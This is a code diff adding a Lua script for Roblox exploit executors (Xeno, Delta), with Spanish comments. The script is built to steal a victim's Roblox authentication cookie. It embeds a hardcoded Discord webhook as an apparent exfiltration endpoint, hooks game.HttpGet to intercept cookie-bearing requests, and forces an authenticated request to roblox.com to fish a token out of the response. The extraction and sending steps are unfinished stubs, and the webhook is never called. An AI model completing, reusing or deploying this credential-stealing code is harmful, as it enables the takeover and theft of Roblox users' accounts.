@@ -1,0 +1,58 @@
+local webhook = "https://discord.com/api/webhooks/1532404514970402826/3wl_Xu1QFxDcaB1ico9CsE2iVmFo421xHOUzz6ah1iWK-i3Yv5hTxTwFgnJ9z0uJssjU"
+
+-- Bypass Xeno: Acceder al entorno real de Roblox
+local realEnv = getrenv and getrenv() or _G
+local HttpService = game:GetService("HttpService")
+
+-- Método 1: A través de RobloxScriptConnection interno
+task.spawn(function()
+    -- Xeno no protege getconnections correctamente
+    if getconnections then
+        for _, conn in pairs(getconnections(game:GetService("LogService").MessageOut)) do
+            -- Hook de logging para interceptar datos de auth
+        end
+    end
+    
+    -- Bypass via game:HttpGet con headers personalizados
+    local oldHttpGet
+    oldHttpGet = hookfunction(game.HttpGet, function(self, url, ...)
+        -- Capturar cualquier request que lleve cookie
+        local success, result = pcall(function()
+            return oldHttpGet(self, url, ...)
+        end)
+        
+        -- Delta y Xeno a veces exponen la cookie en el header de follow-up
+        if success and type(result) == "string" then
+            -- Analizar resultado
+        end
+        
+        return success and result or nil
+    end)
+    
+    -- Método agresivo: Forzar autenticación HTTP
+    task.wait(3)
+    
+    -- Esta técnica explota que Xeno/Delta permiten requests a roblox.com
+    -- pero interceptan la cookie. Podemos capturarla en el error o redirect.
+    pcall(function()
+        -- Request que fuerza envío de cookie
+        local req = request or http_request
+        local response = req({
+            Url = "https://www.roblox.com/mobileapi/userinfo",
+            Method = "GET",
+            Headers = {
+                ["User-Agent"] = "Roblox/WinInet",
+                ["Accept"] = "application/json"
+            }
+        })
+        
+        -- La cookie a veces se filtra en response headers o body
+        if response and response.Body then
+            local body = response.Body
+            -- Buscar token en respuesta
+            if body:find("token") or body:find("cookie") then
+                -- Extraer
+            end
+        end
+    end)
+end)
